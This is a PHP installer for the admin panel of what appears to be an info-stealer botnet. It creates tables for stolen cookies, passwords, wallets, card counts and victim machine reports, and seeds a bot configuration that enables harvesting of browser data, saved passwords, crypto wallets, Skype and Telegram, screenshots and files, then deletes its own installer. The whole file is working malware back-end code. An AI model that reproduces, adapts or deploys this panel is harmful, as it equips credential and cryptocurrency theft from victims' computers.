<?php
error_reporting(0);
function check_password($pwd, &$errors)
{
    $errors_init = $errors;
    if (strlen($pwd) < 10) {
        $errors[] = "Password too short (minimum - 10 chars)!";
    }
    if (!preg_match("#[0-9]+#", $pwd)) {
        $errors[] = "Password must include at least one number!";
    }
    if (!preg_match("#[a-zA-Z]+#", $pwd)) {
        $errors[] = "Password must include at least one letter!";
    }
    return ($errors == $errors_init);
}
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $mysql_db   = $_POST['database'];
    $mysql_user = $_POST['user'];
    $mysql_pass = $_POST['pass'];
    $mysql_host = $_POST['host'];
    $my         = new mysqli($mysql_host, $mysql_user, $mysql_pass, $mysql_db);
    check_password($_POST['password'], $errors);
    if (!empty($errors)) {
        foreach ($errors as $error) {
            echo $error . "<br>";
        }
        die();
    }
    if ($_POST['password'] == $_POST['username']) {
        echo "Please do NOT make a username and password the same.";
        die();
    }
    $username = $my->real_escape_string($_POST['username']);
    $salt     = substr(md5(uniqid()), 0, 10);
    $password = md5(md5($my->real_escape_string($_POST['password'])) . $salt);
	
	// writes variables to file. plug into ./config.php	
	$myFile = "info.txt";
	$fh = fopen($myFile, 'w') or die("can't open file");
	fwrite($fh, $salt);
	fclose($fh);
	
    $my->query("CREATE TABLE `cookies` (
          `id` int(11) NOT NULL,
          `report_id` int(11) NOT NULL,
          `domain` text NOT NULL,
          `value` text NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");
    $my->query("CREATE TABLE `links` (
          `id` int(11) NOT NULL,
          `name` varchar(50) NOT NULL,
          `links` text NOT NULL,
          `color` varchar(10) NOT NULL,
          `description` text NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");
    $my->query("CREATE TABLE `passwords` (
          `id` int(11) NOT NULL,
          `report_id` int(11) NOT NULL,
          `soft_type` int(2) NOT NULL,
          `soft_name` varchar(30) NOT NULL,
          `url` text NOT NULL,
          `username` text NOT NULL,
          `password` text NOT NULL,
          `profile` text NOT NULL,
          `status` int(1) NOT NULL DEFAULT '1',
          `links_id` varchar(50) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");
    $my->query("CREATE TABLE `reports` (
          `id` int(11) NOT NULL,
          `comp_id` varchar(32) NOT NULL,
          `username` varchar(50) NOT NULL,
          `compname` varchar(50) NOT NULL,
          `ip` varchar(50) NOT NULL,
          `country` varchar(2) NOT NULL,
          `time` datetime NOT NULL,
          `osname` varchar(50) NOT NULL,
          `osarch` varchar(3) NOT NULL,
          `osver` varchar(10) NOT NULL,
          `files` int(11) NOT NULL,
          `bin_type` varchar(1) NOT NULL,
          `bin_rights` varchar(1) NOT NULL,
          `crypto` int(11) NOT NULL,
          `cc` int(11) NOT NULL,
          `passwords` int(11) NOT NULL,
          `comment` text NOT NULL,
          `screen` varchar(300) NOT NULL,
          `report_file` varchar(300) NOT NULL,
          `task` varchar(20) NOT NULL,
          `status` int(2) NOT NULL,
          `marked` int(1) NOT NULL DEFAULT '0',
          `pin` int(1) NOT NULL DEFAULT '0'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");
    $my->query("CREATE TABLE `settings` (
          `id` int(11) NOT NULL,
          `name` varchar(30) NOT NULL,
          `value` text NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");
    $my->query("INSERT INTO `settings`(`name`, `value`) VALUES ('bot_config',
        '{\"isDouble\":false,
        \"isSavedPasswords\":true,
        \"isBrowserData\":true,
        \"isWallets\":true,
        \"isSkype\":true,
        \"isTelegram\":true,
        \"isSteam\":false,
        \"isScreenshot\":true,
        \"isDelete\":false,
        \"DAE\":\"\",
        \"files\":[{
                \"fgName\":\"Grab something\",
                \"fgPath\":\"c:\\\",
                \"fgMask\":\"*.txt\",
                \"fgMaxsize\":\"1000\",
                \"fgSubfolders\":true,
                \"fgShortcuts\":true,
                \"fgExceptions\":\"123\"
                }]}')");
    $my->query("CREATE TABLE `users` (
          `id` int(11) NOT NULL,
          `username` varchar(20) NOT NULL,
          `password` varchar(40) NOT NULL,
          `role` varchar(15) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");
    $my->query("ALTER TABLE `cookies` ADD PRIMARY KEY (`id`);");
    $my->query("ALTER TABLE `links` ADD PRIMARY KEY (`id`);");
    $my->query("ALTER TABLE `passwords` ADD PRIMARY KEY (`id`);");
    $my->query("ALTER TABLE `reports` ADD PRIMARY KEY (`id`);");
    $my->query("ALTER TABLE `settings` ADD PRIMARY KEY (`id`);");
    $my->query("ALTER TABLE `users` ADD PRIMARY KEY (`id`);");
    $my->query("ALTER TABLE `cookies` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;");
    $my->query("ALTER TABLE `links` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;");
    $my->query("ALTER TABLE `passwords` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;");
    $my->query("ALTER TABLE `reports` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;");
    $my->query("ALTER TABLE `settings` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;");
    $my->query("ALTER TABLE `users` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;");
    $my->query("INSERT INTO `users`(`username`, `password`) VALUES ('$username', '$password')");
    $config = file_get_contents("config.php");
    $config = str_replace("%HOST%", addslashes($mysql_host), $config);
    $config = str_replace("%PASSWORD%", addslashes($mysql_pass), $config);
    $config = str_replace("%USERNAME%", addslashes($mysql_user), $config);
    $config = str_replace("%DATABASE%", addslashes($mysql_db), $config);
    $config = str_replace("%PASS_SALT%", $salt, $config);
	print $salt;
	print salt;
    file_put_contents("config.php", $config);
    unlink("install.php");
    unlink("gazorpazorp.zip");
    header("Location: ./index.php");
}
?>
<html>
<head>
<meta charset="utf-8"><title>Install</title><link rel="stylesheet" href="./css/style.css">
</head>
<body style="background-image:url('./img/pattern.png');">
<div class="loginpage">
<form method="post" action="" class="login_div">
<table>
        <tr>
                <td><input type="text" name="database" autocomplete='off' placeholder='MySQL database'></td>
        </tr>
        <tr>
                <td><input type="text" name="user" autocomplete='off' placeholder='MySQL user'></td>
        </tr>
        <tr>
                <td><input type="text" name="pass" autocomplete='off' placeholder='MySQL pass'></td>
        </tr>
        <tr>
                <td><input type="text" name="host" autocomplete='off' placeholder='MySQL host'></td>
        </tr>
        <tr>
                <td>&nbsp;</td>
                <td></td>
        </tr>
        <tr>
                <td><input type="text" name="username" autocomplete='off' placeholder='Admin username'></td>
        </tr>
        <tr>
                <td><input type="text" name="password" autocomplete='off' placeholder='Admin password'></td>
        </tr>
        <tr>
                <td><center><input type="submit" value="INSTALL"></center></td>
        </tr>
</table>
</div>
</body>
</html>
